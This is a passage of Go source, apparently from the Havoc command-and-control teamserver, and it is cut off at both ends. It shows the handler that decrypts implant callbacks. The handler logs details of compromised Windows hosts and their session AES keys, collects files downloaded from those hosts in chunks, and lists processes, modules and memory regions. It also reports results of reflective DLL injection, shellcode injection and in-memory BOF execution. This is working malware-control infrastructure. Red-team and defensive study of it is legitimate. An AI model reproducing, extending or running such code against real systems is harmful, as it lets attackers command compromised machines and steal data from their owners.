		return job, errors.New(fmt.Sprint("Command not found", Command))
	}

	return job, nil
}

func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver TeamServer) {
	Parser.DecryptBuffer(a.Encryption.AESKey, a.Encryption.AESIv)

	logger.Debug("Task Output: \n" + hex.Dump(Parser.Buffer()))

	a.UpdateLastCallback(teamserver)

	switch CommandID {

	case COMMAND_GET_JOB:
		/* this is most likely never going to reach. but just in case... */
		break

	case COMMAND_EXIT:
		if Parser.Length() >= 4 {
			var (
				Status  = Parser.ParseInt32()
				Message = make(map[string]string)
			)

			if Status == 1 {
				Message["Type"] = "Good"
				Message["Message"] = "Agent has been tasked to cleanup and exit thread. cya..."
			} else if Status == 2 {
				Message["Type"] = "Good"
				Message["Message"] = "Agent has been tasked to cleanup and exit process. cya..."
			}

			a.Active = false
			teamserver.EventAgentMark(a.NameID, "Dead")

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		}

	case COMMAND_CHECKIN:
		var Message = make(map[string]string)

		Message["Type"] = "Info"
		Message["Message"] = "Received checkin request"

		if Parser.Length() > 0 {
			var (
				MagicValue  int
				DemonID     int
				Hostname    string
				DomainName  string
				Username    string
				InternalIP  string
				ProcessName string
				ProcessPID  int
				OsVersion   []int
				OsArch      int
				Elevated    int
				ProcessArch int
				ProcessPPID int
				SleepDelay  int
				Session     = &Agent{
					Encryption: struct {
						AESKey []byte
						AESIv  []byte
					}{
						AESKey: Parser.ParseAtLeastBytes(32),
						AESIv:  Parser.ParseAtLeastBytes(16),
					},

					Active:     false,
					SessionDir: "",

					Info: new(AgentInfo),
				}
			)

			DemonID = Parser.ParseInt32()
			logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))

			if Parser.Length() >= 4 {
				Hostname = common.StripNull(string(Parser.ParseBytes()))
			} else {
				Message["Type"] = "Info"
				Message["Message"] = "Failed to parse agent request"
				goto SendMessage
			}

			if Parser.Length() >= 4 {
				Username = common.StripNull(string(Parser.ParseBytes()))
			} else {
				Message["Type"] = "Info"
				Message["Message"] = "Failed to parse agent request"
				goto SendMessage
			}

			if Parser.Length() >= 4 {
				DomainName = common.StripNull(string(Parser.ParseBytes()))
			} else {
				Message["Type"] = "Info"
				Message["Message"] = "Failed to parse agent request"
				goto SendMessage
			}

			if Parser.Length() >= 4 {
				InternalIP = common.StripNull(string(Parser.ParseBytes()))
			} else {
				Message["Type"] = "Info"
				Message["Message"] = "Failed to parse agent request"
				goto SendMessage
			}

			ProcessName = common.StripNull(string(Parser.ParseBytes()))
			ProcessPID = Parser.ParseInt32()
			ProcessPPID = Parser.ParseInt32()
			ProcessArch = Parser.ParseInt32()
			Elevated = Parser.ParseInt32()
			OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
			OsArch = Parser.ParseInt32()
			SleepDelay = Parser.ParseInt32()

			Session.Active = true

			Session.NameID = fmt.Sprintf("%x", DemonID)
			Session.Info.MagicValue = MagicValue
			Session.Info.FirstCallIn = a.Info.FirstCallIn
			Session.Info.LastCallIn = a.Info.LastCallIn
			Session.Info.Hostname = Hostname
			Session.Info.DomainName = DomainName
			Session.Info.Username = Username
			Session.Info.InternalIP = InternalIP
			Session.Info.SleepDelay = SleepDelay

			// Session.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
			// Session.Info.Listener 	= t.Name

			switch ProcessArch {

			case PROCESS_ARCH_UNKNOWN:
				Session.Info.ProcessArch = "Unknown"
				break

			case PROCESS_ARCH_X64:
				Session.Info.ProcessArch = "x64"
				break

			case PROCESS_ARCH_X86:
				Session.Info.ProcessArch = "x86"
				break

			case PROCESS_ARCH_IA64:
				Session.Info.ProcessArch = "IA64"
				break

			default:
				Session.Info.ProcessArch = "Unknown"
				break

			}

			Session.Info.OSVersion = getWindowsVersionString(OsVersion)

			switch OsArch {
			case 0:
				Session.Info.OSArch = "x86"
			case 9:
				Session.Info.OSArch = "x64/AMD64"
			case 5:
				Session.Info.OSArch = "ARM"
			case 12:
				Session.Info.OSArch = "ARM64"
			case 6:
				Session.Info.OSArch = "Itanium-based"
			default:
				Session.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
			}

			Session.Info.Elevated = "false"
			if Elevated == 1 {
				Session.Info.Elevated = "true"
			}

			process := strings.Split(ProcessName, "\\")

			Session.Info.ProcessName = process[len(process)-1]
			Session.Info.ProcessPID = ProcessPID
			Session.Info.ProcessPPID = ProcessPPID
			Session.Info.ProcessPath = ProcessName

			Session.SessionDir = logr.LogrInstance.AgentPath + "/" + Session.NameID

			Message["Output"] = fmt.Sprintf(
				"\n"+
					"Teamserver:\n"+
					"  - Session Path       : %v\n"+
					"\n"+
					"Meta Data:\n"+
					"  - Agent ID           : %v\n"+
					"  - Magic Value        : %x\n"+
					"  - First Call In      : %v\n"+
					"  - Last  Call In      : %v\n"+
					"  - AES Key            : %v\n"+
					"  - AES IV             : %v\n"+
					"  - Sleep Delay        : %v\n"+
					"\n"+
					"Host Info:\n"+
					"  - Host Name          : %v\n"+
					"  - User Name          : %v\n"+
					"  - Domain Name        : %v\n"+
					"  - Internal IP        : %v\n"+
					"\n"+
					"Process Info:\n"+
					"  - Process Name       : %v\n"+
					"  - Process Arch       : %v\n"+
					"  - Process ID         : %v\n"+
					// "  - Process Parent ID  : %v\n" +
					"  - Process Path       : %v\n"+
					"  - Process Elevated   : %v\n"+
					"\n"+
					"Operating System:\n"+
					"  - Version            : %v\n"+
					"  - Build              : %v.%v.%v.%v.%v\n"+
					"  - Arch               : %v\n"+
					"",

				// Teamserver
				Session.SessionDir,

				// Meta Data
				Session.NameID,
				Session.Info.MagicValue,
				Session.Info.FirstCallIn,
				Session.Info.LastCallIn,
				hex.EncodeToString(Session.Encryption.AESKey),
				hex.EncodeToString(Session.Encryption.AESIv),
				Session.Info.SleepDelay,

				// Host info
				Session.Info.Hostname,
				Session.Info.Username,
				Session.Info.DomainName,
				Session.Info.InternalIP,

				// Process Info
				Session.Info.ProcessName,
				Session.Info.ProcessArch,
				Session.Info.ProcessPID,
				Session.Info.ProcessPath,
				Session.Info.Elevated,

				// Operating System Info
				Session.Info.OSVersion,
				OsVersion[0], OsVersion[1], OsVersion[2], OsVersion[3], OsVersion[4],
				Session.Info.OSArch,

				// TODO: add Optional data too
			)

			Session = nil
		}

	SendMessage:
		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case DEMON_INFO:
		var (
			InfoID = int(Parser.ParseInt32())
			Output = make(map[string]string)
		)

		Output["Type"] = "Info"

		switch InfoID {
		case DEMON_INFO_MEM_ALLOC:
			var (
				MemPointer   = Parser.ParseInt32()
				MemSize      = Parser.ParseInt32()
				ProtectionId = Parser.ParseInt32()
				Protection   string
			)

			if s, ok := win32.Protections[int(ProtectionId)]; ok {
				Protection = s[1]
			} else {
				Protection = "UNKNOWN"
			}

			Output["Message"] = fmt.Sprintf("Memory Allocated : Pointer:[0x%x] Size:[%d] Protection:[%v]", MemPointer, MemSize, Protection)
			break

		case DEMON_INFO_MEM_EXEC:
			var (
				MemFunction = Parser.ParseInt32()
				ThreadId    = Parser.ParseInt32()
			)

			Output["Message"] = fmt.Sprintf("Memory Executed  : Function:[0x%x] ThreadId:[%d]", MemFunction, ThreadId)
			break

		case DEMON_INFO_MEM_PROTECT:
			var (
				Memory        = Parser.ParseInt32()
				MemorySize    = Parser.ParseInt32()
				OldProtection = Parser.ParseInt32()
				Protection    = Parser.ParseInt32()
				ProcString    string
			)

			if s, ok := win32.Protections[OldProtection]; ok {
				ProcString = s[1] + " -> "
			} else {
				ProcString = "UNKNOWN" + " -> "
			}

			if s, ok := win32.Protections[Protection]; ok {
				ProcString += s[1]
			} else {
				ProcString += "UNKNOWN"
			}

			Output["Message"] = fmt.Sprintf("Memory Protection: Memory:[0x%x] Size:[%d] Protection[%v]", Memory, MemorySize, ProcString)
			break

		case DEMON_INFO_PROC_CREATE:
			var (
				Path = string(Parser.ParseBytes())
				PID  = Parser.ParseInt32()
			)

			Output["Message"] = fmt.Sprintf("Process started: Path:[%v] ProcessID:[%v]", Path, PID)
			break
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
		break

	case COMMAND_SLEEP:
		var Output = make(map[string]string)

		a.Info.SleepDelay = Parser.ParseInt32()

		Output["Type"] = "Good"
		Output["Message"] = fmt.Sprintf("Set sleep interval to %v seconds", a.Info.SleepDelay)

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)

		break

	case COMMAND_JOB:
		var Message = make(map[string]string)

		if Parser.Length() >= 4 {

			var SubCommand = Parser.ParseInt32()

			switch SubCommand {

			case 0x1:
				var Output string

				Output += fmt.Sprintf(" %-6s  %-13s  %-5s\n", "Job ID", "Type", "State")
				Output += fmt.Sprintf(" %-6s  %-13s  %-5s\n", "------", "----", "-----")

				if Parser.Length() > 4 {
					var (
						JobID int
						Type  int
						State int

						StringType  string
						StringState string
					)

					JobID = Parser.ParseInt32()
					Type = Parser.ParseInt32()
					State = Parser.ParseInt32()

					if Type == 0x1 {
						StringType = "Thread"
					} else if Type == 0x2 {
						StringType = "Process"
					} else if Type == 0x3 {
						StringType = "Track Process"
					} else {
						StringType = "Unknown"
					}

					if State == 0x1 {
						StringState = "Running"
					} else if State == 0x2 {
						StringState = "Suspended"
					} else if State == 0x3 {
						StringState = "Dead"
					} else {
						StringState = "Unknown"
					}

					Output += fmt.Sprintf(" %-6v  %-13s  %-5s\n", JobID, StringType, StringState)
				}

				Message["Type"] = "Info"
				Message["Message"] = "Job list:"
				Message["Output"] = "\n" + Output

				break

			case 0x2:
				if Parser.Length() > 4 {
					var (
						JobID   = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					if Success == win32.TRUE {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successful suspended job %v", JobID)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to suspended job %v", JobID)
					}

				}
				break

			case 0x3:
				if Parser.Length() > 4 {
					var (
						JobID   = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					if Success == win32.TRUE {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successful resumed job %v", JobID)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to resumed job %v", JobID)
					}
				}
				break

			case 0x4:
				if Parser.Length() > 4 {
					var (
						JobID   = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					if Success == win32.TRUE {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successful killed and removed job %v", JobID)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to kill job %v", JobID)
					}
				}
				break
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
			break
		}

	case COMMAND_FS:
		logger.Debug("COMMAND_FS")
		var (
			SubCommand = Parser.ParseInt32()
			Output     = make(map[string]string)
		)

		switch SubCommand {
		case 1:
			var (
				Exp32    = Parser.ParseInt32()
				Path     = Parser.ParseBytes()
				Dir      string
				DirMap   = make(map[string]any)
				DirArr   []map[string]string
				Explorer = false
			)

			if Parser.Length() > 0 {
				if Exp32 == win32.TRUE {
					Explorer = true
				}

				if !Explorer {
					Dir += "\n"
					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "Size", "Type", "Last Modified      ", "Name")
					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "----", "----", "-------------------", "----")
				}

				for Parser.Length() >= 4 {
					var (
						IsDir            = Parser.ParseInt32()
						FileSize         = Parser.ParseInt64()
						LastAccessDay    = Parser.ParseInt32()
						LastAccessMonth  = Parser.ParseInt32()
						LastAccessYear   = Parser.ParseInt32()
						LastAccessSecond = Parser.ParseInt32()
						LastAccessMinute = Parser.ParseInt32()
						LastAccessHour   = Parser.ParseInt32()
						FileName         = Parser.ParseBytes()

						Size         string
						Type         string
						LastModified string
						Name         string
					)

					Type = "file"
					Size = ""
					if IsDir == win32.TRUE {
						Type = "dir"
					} else {
						Size = common.ByteCountSI(int64(FileSize))
					}

					LastModified = fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", LastAccessDay, LastAccessMonth, LastAccessYear, LastAccessSecond, LastAccessMinute, LastAccessHour)
					Name = common.DecodeUTF16(FileName)

					// ignore these. not needed
					if Name == "." || Name == ".." || Name == "" {
						continue
					}

					if !Explorer {
						Dir += fmt.Sprintf(" %-12s %-8s %-20s  %-8v\n", Size, Type, LastModified, Name)
					} else {
						DirArr = append(DirArr, map[string]string{
							"Type":     Type,
							"Size":     Size,
							"Modified": LastModified,
							"Name":     Name,
						})
					}

				}

				if !Explorer {
					Output["Type"] = "Info"
					Output["Message"] = fmt.Sprintf("List Directory: %v", common.DecodeUTF16(Path))
					Output["Output"] = Dir
				} else {
					DirMap["Path"] = []byte(common.DecodeUTF16(Path))
					DirMap["Files"] = DirArr

					DirJson, err := json.Marshal(DirMap)
					if err != nil {
						logger.Debug("[Error] " + err.Error())
					} else {
						Output["MiscType"] = "FileExplorer"
						Output["MiscData"] = base64.StdEncoding.EncodeToString(DirJson)
					}
				}
			} else {
				Output["Type"] = "Error"
				Output["Message"] = "No files/folders at specified path"
			}

			break

		/* Download */
		case 2:

			/*
			 * Download Header:
			 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
			 *  [ File ID   ] Download File ID
			 *
			 * Data (Open):
			 *  [ File Size ]
			 *  [ File Name ]
			 *
			 * Data (Write)
			 *  [ Chunk Data ] Size + FileChunk
			 *
			 * Data (Close):
			 *  [ File Name ]
			 *  [  Reason   ] Removed or Finished
			 * */

			if Parser.Length() >= 8 {
				var (
					Mode   = Parser.ParseInt32()
					FileID = Parser.ParseInt32()
				)

				switch Mode {

				/* File Open */
				case 0x0:
					logger.Debug(fmt.Sprintf("Download open FileID:[%x]", FileID))

					if Parser.Length() >= 8 {
						var (
							FileSize = Parser.ParseInt32()
							FileName = common.DecodeUTF16(Parser.ParseBytes())
							Size     = common.ByteCountSI(int64(FileSize))
						)

						Output["Type"] = "Info"
						Output["Message"] = fmt.Sprintf("Started download of file: %v [%v]", FileName, Size)

						if err := a.DownloadAdd(FileID, FileName, FileSize); err != nil {
							Output["Type"] = "Error"
							Output["Message"] = err.Error()
						} else {
							Output["MiscType"] = "download"
							Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + Size
						}
					}

					break

				case 0x1:
					logger.Debug(fmt.Sprintf("Download write FileID:[%v]", FileID))

					if Parser.Length() >= 4 {
						var FileChunk = Parser.ParseBytes()

						a.DownloadWrite(FileID, FileChunk)
					}

					break

				case 0x2:
					logger.Debug(fmt.Sprintf("Download close FileID:[%v]", FileID))

					if Parser.Length() >= 4 {
						var (
							FileName string
							Reason   = Parser.ParseInt32()
						)

						if len(a.Downloads) > 0 {
							var download = a.DownloadGet(FileID)
							if download != nil {
								FileName = download.FilePath
							}

							if Reason == 0x0 {
								Output["Type"] = "Good"
								Output["Message"] = fmt.Sprintf("Finished download of file: %v", FileName)

								a.DownloadClose(FileID)
							} else if Reason == 0x1 {
								Output["Type"] = "Info"
								Output["Message"] = fmt.Sprintf("Download has been removed: %v", FileName)

								a.DownloadClose(FileID)
							}
						} else {
							/* TODO: handle this error. or simply ignore this ? */
						}

					}

					break
				}
			} else {
				logger.Debug("Parser.Length() < 8")
			}

			break

		case 3:

			if Parser.Length() >= 8 {
				var (
					FileSize = Parser.ParseInt32()
					FileName = Parser.ParseBytes()
				)

				Output["Type"] = "Info"
				Output["Message"] = fmt.Sprintf("Uploaded file: %v (%v)", string(FileName), FileSize)
			} else {
				Output["Type"] = "Error"
				Output["Message"] = "Failed to parse FS::Upload response"
			}

			break

		case 4:
			var Path = common.DecodeUTF16(Parser.ParseBytes())

			Output["Type"] = "Info"
			Output["Message"] = fmt.Sprintf("Changed directory: %v", Path)

			break

		case 5:
			var (
				IsDir = Parser.ParseInt32()
				Path  = common.DecodeUTF16(Parser.ParseBytes())
			)

			Output["Type"] = "Info"

			if IsDir == win32.TRUE {
				Output["Message"] = fmt.Sprintf("Removed directory: %v", string(Path))
			} else {
				Output["Message"] = fmt.Sprintf("Removed file: %v", string(Path))
			}
			break

		case 6:
			var Path = common.DecodeUTF16(Parser.ParseBytes())

			Output["Type"] = "Info"
			Output["Message"] = fmt.Sprintf("Created directory: %v", string(Path))

			break

		case 7:
			if Parser.Length() > 4 {
				var (
					Success  = Parser.ParseInt32()
					PathFrom = common.DecodeUTF16(Parser.ParseBytes())
					PathTo   = common.DecodeUTF16(Parser.ParseBytes())
				)

				if Success == win32.TRUE {
					Output["Type"] = "Good"
					Output["Message"] = fmt.Sprintf("Successful copied file %v to %v", PathFrom, PathTo)
				} else {
					Output["Type"] = "Error"
					Output["Message"] = fmt.Sprintf("Failed to copied file %v to %v", PathFrom, PathTo)
				}
			}

			break

		case 9:
			var Path = common.DecodeUTF16(Parser.ParseBytes())

			Output["Type"] = "Info"
			Output["Message"] = fmt.Sprintf("Current directory: %v", string(Path))

			break

		case 10:
			if Parser.Length() >= 8 {
				var (
					FileName    = Parser.ParseBytes()
					FileContent = Parser.ParseBytes()
				)
				Output["Type"] = "Info"
				Output["Message"] = fmt.Sprintf("File content of %v (%v):", common.DecodeUTF16(FileName), len(FileContent))
				Output["Output"] = string(FileContent)

			} else {
				Output["Type"] = "Error"
				Output["Message"] = "Failed to parse fs::cat response"
			}
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)

		break

	case COMMAND_PROC_LIST:
		type Process struct {
			Name      string
			ImagePath string
			PID       string
			PPID      string
			Session   string
			IsWow     int
			Threads   string
			User      string
		}

		var (
			tableData     [][]string
			Processlist   []Process
			processes     int
			Output        = make(map[string]string)
			ProcessUI     = Parser.ParseInt32()
			ProcessTable  string
			ProcessMaxStr int
		)

		for Parser.Length() != 0 {
			var (
				collum  []string
				Process Process
			)

			Process.Name = common.DecodeUTF16(Parser.ParseBytes())
			Process.PID = strconv.Itoa(Parser.ParseInt32())
			Process.IsWow = Parser.ParseInt32()
			Process.PPID = strconv.Itoa(Parser.ParseInt32())
			Process.Session = strconv.Itoa(Parser.ParseInt32())
			Process.Threads = strconv.Itoa(Parser.ParseInt32())
			Process.User = string(Parser.ParseBytes())

			var ProcessArch = "x64"
			if Process.IsWow == win32.TRUE {
				ProcessArch = "x86"
			}

			// trim null bytes
			Process.User = string(bytes.Trim([]byte(Process.User), "\x00"))

			collum = []string{Process.Name, Process.PID, Process.PPID, Process.Session, ProcessArch, Process.Threads, Process.User}

			tableData = append(tableData, collum)
			Processlist = append(Processlist, Process)
			processes++

			if len(Process.Name) > ProcessMaxStr {
				ProcessMaxStr = len(Process.Name)
			}
		}

		FormatTable := fmt.Sprintf(" %%-%vs   %%-4s   %%-4s   %%-7s   %%-5s   %%-7s   %%-4s", ProcessMaxStr)
		ProcessTable += fmt.Sprintf(FormatTable+"\n", "Name", "PID", "PPID", "Session", "Arch", "Threads", "User")
		ProcessTable += fmt.Sprintf(FormatTable+"\n", "----", "---", "----", "-------", "----", "-------", "----")

		for _, process := range Processlist {
			var ProcessArch = "x64"
			if process.IsWow == win32.TRUE {
				ProcessArch = "x86"
			}

			ProcessTable += fmt.Sprintf(FormatTable+"\n", process.Name, process.PID, process.PPID, process.Session, ProcessArch, process.Threads, process.User)
		}

		var ProcessListJson, _ = json.Marshal(Processlist)

		if ProcessUI == win32.FALSE {
			Output["Type"] = "Info"
			Output["Message"] = "Process List:"
			Output["Output"] = "\n" + ProcessTable
		} else {
			logger.Debug("Process UI")
			Output["MiscType"] = "ProcessUI"
			Output["MiscData"] = base64.StdEncoding.EncodeToString(ProcessListJson)
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)

	case COMMAND_OUTPUT:
		var Output = make(map[string]string)

		Output["Type"] = "Good"
		Output["Output"] = string(Parser.ParseBytes())
		Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)

	case CALLBACK_OUTPUT_OEM:
		var Output = make(map[string]string)

		Output["Type"] = "Good"
		Output["Output"] = common.DecodeUTF16(Parser.ParseBytes())
		Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)

	case COMMAND_INJECT_DLL:
		var (
			Status  = Parser.ParseInt32()
			Message = make(map[string]string)
		)

		if Status == win32.TRUE {
			Message["Type"] = "Good"
			Message["Message"] = "Successful injected reflective dll"
		} else {
			String, ok := InjectErrors[Status]
			if ok {
				String = fmt.Sprintf("Status:[%v]", String)
			}

			Message["Type"] = "Error"
			Message["Message"] = "Failed to inject reflective dll: " + String
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_SPAWNDLL:
		var (
			Status  = Parser.ParseInt32()
			Message = make(map[string]string)
		)

		if Status == win32.TRUE {
			Message["Type"] = "Good"
			Message["Message"] = "Successful spawned reflective dll"
		} else {
			String, ok := InjectErrors[Status]
			if ok {
				String = fmt.Sprintf("Status:[%v]", String)
			}

			Message["Type"] = "Error"
			Message["Message"] = "Failed to spawned reflective dll: " + String
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_INJECT_SHELLCODE:
		var (
			Status  = Parser.ParseInt32()
			Message = make(map[string]string)
		)

		if Status == win32.TRUE {
			Message["Type"] = "Good"
			Message["Message"] = "Successful injected shellcode"
		} else {
			Message["Type"] = "Error"
			Message["Message"] = "Failed to inject shellcode"
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_PROC:
		var (
			Message    = make(map[string]string)
			SubCommand = Parser.ParseInt32()
		)

		switch SubCommand {
		case 1:
			break

		case 2:
			if Parser.Length() > 0 {
				var (
					ModuleName string
					ModuleBase string
					ProcessID  = Parser.ParseInt32()

					OutputBuffer bytes.Buffer
					tableData    [][]string
				)

				for Parser.Length() != 0 {

					table := tablewriter.NewWriter(&OutputBuffer)

					table.SetHeader([]string{"Name", "Base Address"})
					table.SetBorder(false)
					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

					table.SetRowSeparator("-")
					table.SetColumnSeparator("│")
					table.SetCenterSeparator("+")

					for Parser.Length() != 0 {
						var (
							collum []string
						)

						ModuleName = string(Parser.ParseBytes())
						ModuleBase = "0x0" + strconv.FormatInt(int64(uint32(Parser.ParseInt32())), 16)

						collum = []string{strings.ReplaceAll(ModuleName, " ", ""), ModuleBase} // TODO: fix this to avoid new line in the havoc console
						tableData = append(tableData, collum)
					}
					table.AppendBulk(tableData)
					table.Render()
				}

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("List loaded modules/dll from process %v:", ProcessID)
				Message["Output"] = "\n" + OutputBuffer.String()

			} else {
				Message["Type"] = "Error"
				Message["Message"] = "Couldn't list loaded modules/dll from specified process: "
			}
			break

		case 3:
			if Parser.Length() > 0 {
				var (
					ProcName  string
					ProcID    int
					ParentPID int
					ProcUser  string
					ProcArch  int

					Output string
				)

				for Parser.Length() != 0 {
					ProcName = string(Parser.ParseBytes())
					ProcID = Parser.ParseInt32()
					ParentPID = Parser.ParseInt32()
					ProcUser = string(Parser.ParseBytes())
					ProcArch = Parser.ParseInt32()

					Output += fmt.Sprintf(
						"\n   Process Name : %v\n   Process ID   : %v\n   Parent PID   : %v\n   Process User : %v\n   Process Arch : x%v\n",
						ProcName, ProcID, ParentPID, ProcUser, ProcArch,
					)
				}

				Message["Type"] = "Info"
				Message["Message"] = "Found one or more processes:"
				Message["Output"] = Output

			} else {
				Message["Type"] = "Error"
				Message["Message"] = "Couldn't find specified process"
			}
			break

		case 4: // Proc:Create

			if Parser.Length() >= 4 {
				var ProcessID = Parser.ParseInt32()

				Message["Type"] = "Info"
				Message["Message"] = fmt.Sprintf("Successful spawned a process: %v", ProcessID)
			}

			break

		case 5: // Proc:BlockDll
			var (
				BlockDll = int(Parser.ParseInt32())
				State    = "disabled"
			)

			if BlockDll == 1 {
				State = "enabled"
			}

			Message["Type"] = "Info"
			Message["Message"] = "Successful " + State + " blockdll"
			break

		case 6: // Proc:Memory
			var (
				BaseAddress    string
				RegionSize     string
				AllocateProtec string
				// State 			string
				// Type			string

				iProtect int
				iState   int
				iType    int

				_ = Parser.ParseInt32()
				_ = Parser.ParseInt32()

				OutputBuffer bytes.Buffer
				tableData    [][]string
			)

			for Parser.Length() != 0 {

				table := tablewriter.NewWriter(&OutputBuffer)

				table.SetHeader([]string{"Base Address", "Type", "Protection", "State", "Region Size"})
				table.SetBorder(false)
				table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
				table.SetColumnAlignment([]int{tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_CENTER, tablewriter.ALIGN_RIGHT})

				table.SetRowSeparator("-")
				table.SetColumnSeparator("│")
				table.SetCenterSeparator("+")

				for Parser.Length() != 0 {
					var (
						collum []string
					)

					BaseAddress = "0x0" + strconv.FormatInt(int64(Parser.ParseInt32()), 16)
					RegionSize = utils.ByteCountSI(int64(Parser.ParseInt32()))
					iProtect = int(Parser.ParseInt32())
					iState = int(Parser.ParseInt32())
					iType = int(Parser.ParseInt32())

					if Protection, ok := win32.Protections[iProtect]; !ok {
						AllocateProtec = "UNKNOWN"
					} else {
						AllocateProtec = Protection[0]
					}

					/*switch iProtect {

					  case win32.PAGE_NOACCESS:
					  	AllocateProtec = "PAGE_NOACCESS"
					  case win32.PAGE_READONLY:
					  	AllocateProtec = "PAGE_READONLY"
					  case win32.PAGE_READWRITE:
					  	AllocateProtec = "PAGE_READWRITE"
					  case win32.PAGE_WRITECOPY:
					  	AllocateProtec = "PAGE_WRITECOPY"
					  case win32.PAGE_EXECUTE:
					  	AllocateProtec = "PAGE_EXECUTE"
					  case win32.PAGE_EXECUTE_READ:
					  	AllocateProtec = "PAGE_EXECUTE_READ"
					  case win32.PAGE_EXECUTE_READWRITE:
					  	AllocateProtec = "PAGE_EXECUTE_READWRITE"
					  case win32.PAGE_EXECUTE_WRITECOPY:
					  	AllocateProtec = "PAGE_EXECUTE_WRITECOPY"
					  case win32.PAGE_GUARD:
					  	AllocateProtec = "PAGE_GUARD"
					  default:
					  	AllocateProtec = strconv.Itoa(iProtect)
					  }*/

					collum = []string{BaseAddress, strconv.Itoa(iType), AllocateProtec, strconv.Itoa(iState), RegionSize}
					tableData = append(tableData, collum)
				}
				table.AppendBulk(tableData)
				table.Render()
			}

			if OutputBuffer.Len() > 0 {
				Message["Type"] = "Info"
				Message["Message"] = "List memory regions:"
				Message["Output"] = "\n" + OutputBuffer.String()
			} else {
				Message["Type"] = "Error"
				Message["Message"] = "Couldn't list memory regions"
			}

			break

		case 7:

			if Parser.Length() >= 4 {
				var (
					Success   = Parser.ParseInt32()
					ProcessID = Parser.ParseInt32()
				)

				if Success == win32.TRUE {
					Message["Type"] = "Good"
					Message["Message"] = fmt.Sprintf("Successful killed process: %v", ProcessID)
				} else {
					Message["Type"] = "Error"
					Message["Message"] = "Failed to kill process"
				}
			}

		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_INLINEEXECUTE:
		var (
			OutputMap = make(map[string]string)
			Type      = Parser.ParseInt32()
		)

		switch Type {
		case 0x0:
			OutputMap["Output"] = string(Parser.ParseBytes())
			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)

			break

		case 0x90:
			var String = Parser.ParseBytes()

			OutputMap["Type"] = "Good"
			OutputMap["Message"] = string(String)

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			break

		case 0x91:
			var String = Parser.ParseBytes()

			OutputMap["Type"] = "Info"
			OutputMap["Message"] = string(String)

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			break

		case 0x92:
			var String = Parser.ParseBytes()

			OutputMap["Type"] = "Error"
			OutputMap["Message"] = string(String)

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			break

		case 0x98:
			var (
				Exception = Parser.ParseInt32()
				Address   = Parser.ParseInt64()
			)

			OutputMap["Type"] = "Error"
			OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] accured while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
			break

		case 0x99:
			var LibAndFunc = string(Parser.ParseBytes())
			logger.Debug(hex.Dump(Parser.Buffer()))

			OutputMap["Type"] = "Error"
			OutputMap["Message"] = "Symbol not found: " + LibAndFunc

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)

			break

		}

	case COMMAND_ERROR:
		var (
			ErrorID = Parser.ParseInt32()
			Message = make(map[string]string)
		)

		switch ErrorID {
		case ERROR_WIN32_LASTERROR:
			var (
				ErrorCode          = Parser.ParseInt32()
				ErrorString, found = Win32ErrorCodes[int(ErrorCode)]
			)

			ErrorString += " "

			if !found {
				ErrorString = ""
			}

			Message["Type"] = "Error"
			Message["Message"] = fmt.Sprintf("Win32 Error: %v [%v]", ErrorString, ErrorCode)
			break

		case ERROR_COFFEXEC:
			var (
